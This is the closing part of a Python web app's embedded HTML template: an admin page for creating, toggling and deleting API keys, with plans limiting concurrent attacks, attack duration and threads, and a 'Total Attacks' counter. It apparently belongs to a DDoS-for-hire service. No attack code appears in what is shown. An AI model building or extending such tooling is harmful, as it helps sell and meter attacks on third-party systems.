  text-transform: uppercase; color: var(--muted); text-align: left; white-space: nowrap;
}
td {
  padding: 14px 16px; font-size: 14px; font-weight: 500;
  border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle;
}
tbody tr { transition: background 0.2s; }
tbody tr:hover { background: rgba(255,40,100,0.04); }
tbody tr:last-child td { border-bottom: none; }

.key-code {
  font-family: 'Orbitron', monospace; font-size: 11px;
  color: var(--accent2); letter-spacing: 1px;
  background: rgba(255,40,100,0.07);
  border: 1px solid rgba(255,40,100,0.15);
  border-radius: 6px; padding: 4px 10px;
  display: inline-block; max-width: 190px;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  vertical-align: middle;
}
.copy-btn { background: none; border: none; cursor: pointer; color: var(--muted); font-size: 13px; padding-left: 6px; transition: color 0.2s; }
.copy-btn:hover { color: var(--accent2); }

.status-badge { display: inline-flex; align-items: center; gap: 5px; }
.status-active { color: var(--green); }
.status-inactive { color: var(--accent); }

.action-group { display: flex; align-items: center; gap: 6px; }
.action-group form { display: inline; }

.empty-state { text-align: center; padding: 48px 20px; color: var(--muted); }
.empty-icon  { font-size: 40px; margin-bottom: 12px; opacity: 0.4; }

@keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }

@media (max-width: 768px) {
  .gen-grid { grid-template-columns: 1fr 1fr; }
  .custom-row { grid-template-columns: 1fr 1fr; }
  .stats-row { grid-template-columns: 1fr; }
}
@media (max-width: 480px) {
  .gen-grid { grid-template-columns: 1fr; }
  .custom-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="container">

  <!-- Topbar -->
  <div class="topbar">
    <a href="/admin/dashboard" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    <h1 class="page-title">API Key Management</h1>
    <div class="admin-badge"><div class="badge-dot"></div> Admin Panel</div>
  </div>

  <!-- Stats -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-icon green"><i class="fas fa-check-circle"></i></div>
      <div>
        <div class="stat-val">{{ keys | selectattr('active') | selectattr('expires_at', 'none') | list | length + keys | selectattr('active') | selectattr('expires_at', 'ne', None) | selectattr('expires_at', 'ge', now) | list | length }}</div>
        <div class="stat-label">Active Keys</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon blue"><i class="fas fa-bolt"></i></div>
      <div>
        <div class="stat-val">{{ keys | sum(attribute='total_attacks') }}</div>
        <div class="stat-label">Total Attacks</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon red"><i class="fas fa-key"></i></div>
      <div>
        <div class="stat-val">{{ keys | length }}</div>
        <div class="stat-label">Total Keys</div>
      </div>
    </div>
  </div>

  <!-- Generate New API Key -->
  <div class="section-title"><i class="fas fa-plus-circle"></i> Create New API Key</div>
  <div class="panel" style="animation: fadeUp 0.6s ease 0.1s both;">
    <div class="panel-header"><i class="fas fa-key"></i> New API Credentials</div>
    <div class="panel-body">
      <form method="POST" action="/admin/api_keys/create">
        <div class="gen-grid">
          <div class="field">
            <label>User ID</label>
            <input type="text" name="user_id" class="form-input" placeholder="User ID" required>
          </div>
          <div class="field">
            <label>Key Name</label>
            <input type="text" name="name" class="form-input" placeholder="e.g. My Bot" value="API Key">
          </div>
          <div class="field">
            <label>Plan</label>
            <select name="plan_name" class="form-select" id="planSelect" onchange="toggleCustom(this.value)">
              <option value="">-- Select Plan --</option>
              {% for p in plans %}<option value="{{ p.name }}">{{ p.name }}</option>{% endfor %}
              <option value="custom">Custom</option>
            </select>
          </div>
          <div class="field">
            <label>Expires (days)</label>
            <input type="number" name="expires_days" class="form-input" placeholder="Never">
          </div>
        </div>

        <div id="customLimits" style="display:none;">
          <div class="custom-row">
            <div class="field">
              <label>Max Concurrent</label>
              <input type="number" name="custom_concurrent" class="form-input" placeholder="e.g. 5">
            </div>
            <div class="field">
              <label>Max Duration (s)</label>
              <input type="number" name="custom_duration" class="form-input" placeholder="e.g. 300">
            </div>
            <div class="field">
              <label>Max Threads</label>
              <input type="number" name="custom_threads" class="form-input" placeholder="e.g. 5000">
            </div>
          </div>
        </div>

        <div style="margin-top: 20px;">
          <button type="submit" class="btn btn-generate"><i class="fas fa-magic"></i> Generate API Key</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Existing API Keys -->
  <div class="section-title"><i class="fas fa-list"></i> Existing API Keys</div>
  <div class="panel" style="animation: fadeUp 0.6s ease 0.2s both;">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Name</th>
            <th>User</th>
            <th>Key</th>
            <th>Plan / Limits</th>
            <th>Active</th>
            <th>Attacks</th>
            <th>Last Used</th>
            <th>Expires</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          {% for k in keys %}
          <tr>
            <td style="font-weight:600;">{{ k.name }}</td>
            <td style="color:var(--blue); font-weight:500;">{{ user_map.get(k.user_id, k.user_id) }}</td>
            <td>
              <span class="key-code" title="{{ k.key }}">{{ k.key[:12] }}...</span>
              <button class="copy-btn" onclick="copyKey('{{ k.key }}')" title="Copy full key"><i class="fas fa-copy"></i></button>
            </td>
            <td>
              {% if k.plan_name %}
                <span style="background:rgba(255,200,0,0.1); border:1px solid rgba(255,200,0,0.2); border-radius:6px; padding:2px 8px; font-size:12px; font-weight:700; color:var(--yellow);">{{ k.plan_name }}</span>
              {% elif k.max_concurrent %}
                <span style="font-size:12px; color:var(--muted);">Custom ({{ k.max_concurrent }}/{{ k.max_duration }}s/{{ k.max_threads }}t)</span>
              {% else %}
                <span style="color:var(--muted);">User Plan</span>
              {% endif %}
            </td>
            <td>
              {% if k.active %}
                <span class="status-badge status-active"><i class="fas fa-circle" style="font-size:8px;"></i> Active</span>
              {% else %}
                <span class="status-badge status-inactive"><i class="fas fa-circle" style="font-size:8px;"></i> Inactive</span>
              {% endif %}
            </td>
            <td style="font-family:'Orbitron',monospace; font-size:13px;">{{ k.total_attacks }}</td>
            <td style="font-size:13px; color:var(--muted);">{{ k.last_used.strftime('%Y-%m-%d') if k.last_used else 'Never' }}</td>
            <td style="font-size:13px; color:var(--muted);">
              {{ k.expires_at.strftime('%Y-%m-%d') if k.expires_at else 'Never' }}
            </td>
            <td>
              <div class="action-group">
                <form method="POST" action="/admin/api_keys/{{ k._id if USE_MONGO else k.id }}/toggle">
                  <button type="submit" class="btn btn-sm btn-warning"><i class="fas fa-power-off"></i> Toggle</button>
                </form>
                <form method="POST" action="/admin/api_keys/{{ k._id if USE_MONGO else k.id }}/delete" onsubmit="return confirm('Delete API key {{ k.name }}?')">
                  <button type="submit" class="btn btn-sm btn-danger"><i class="fas fa-trash"></i> Delete</button>
                </form>
              </div>
            </td>
          </tr>
          {% else %}
          <tr>
            <td colspan="9">
              <div class="empty-state">
                <div class="empty-icon">🗝️</div>
                No API keys generated yet. Use the form above to create one.
              </div>
            </td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

</div>

<script>
function toggleCustom(val) {
  const customDiv = document.getElementById('customLimits');
  if (val === 'custom') {
    customDiv.style.display = 'block';
  } else {
    customDiv.style.display = 'none';
  }
}
function copyKey(key) {
  navigator.clipboard.writeText(key).then(() => {
    alert('Key copied!');
  });
}
// Initialize on load if custom preselected (unlikely, but for safety)
if (document.getElementById('planSelect').value === 'custom') {
  document.getElementById('customLimits').style.display = 'block';
}
</script>

</body>
</html>
'''


# ==================== RUN ====================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)